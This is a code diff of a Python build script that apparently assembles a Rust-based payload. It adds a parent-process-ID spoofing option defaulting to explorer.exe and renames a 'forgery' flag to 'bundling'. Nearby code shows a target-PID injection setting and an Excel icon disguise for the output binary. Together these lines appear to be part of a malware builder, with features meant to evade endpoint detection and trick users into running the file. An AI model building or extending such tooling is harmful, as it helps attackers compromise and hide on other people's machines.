@@ -78,11 +78,13 @@ def build_features(params: Dict[str, Any], fmap: Dict[str, Dict[str, str]]) -> L
         feats.append(scf)
 
     if params.get("forgery_enable"):
-        feats.append("with_forgery")
+        feats.append("with_bundling")
     if params.get("win7_compat"):
         feats.append("win7")
     if params.get("debug_mode"):
         feats.append("debug")
+    if params.get("enable_ppid_spoofing"):
+        feats.append("ppid_spoofing")
 
     seen = set()
     ordered: List[str] = []
@@ -152,6 +154,10 @@ async def build_rust(params: Dict[str, Any], manifest: Dict[str, Any], fmap: Dic
     elif pattern == 3:
         env["RSL_TARGET_PID"] = params.get("target_pid", "0")
         env_overrides["RSL_TARGET_PID"] = env["RSL_TARGET_PID"]
+
+    if params.get("enable_ppid_spoofing"):
+        env["RSL_PARENT_PROCESS_NAME"] = params.get("parent_process_name", "explorer.exe")
+        env_overrides["RSL_PARENT_PROCESS_NAME"] = env["RSL_PARENT_PROCESS_NAME"]
 
     env["RSL_ICON_PATH"] = params.get("icon_path", "icons/excel.ico")
     env_overrides["RSL_ICON_PATH"] = env["RSL_ICON_PATH"]
